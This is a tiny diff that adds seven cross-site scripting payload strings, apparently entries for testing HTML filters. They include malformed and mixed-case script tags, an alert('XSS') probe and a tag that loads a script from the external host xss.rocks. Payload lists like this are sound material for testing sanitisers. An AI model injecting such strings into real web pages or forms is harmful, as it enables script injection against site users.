@@ -1,0 +1,7 @@
+<scripting></script>
+<scripting></scripting>
+<script/script>
+<script></scripting>
+<< ScRiPT >alert (”XSS”);//<</ ScRiPT >
+<script></script>
+<SCRIPT SRC=http://xss.rocks/xss_error.js></SCRIPT>
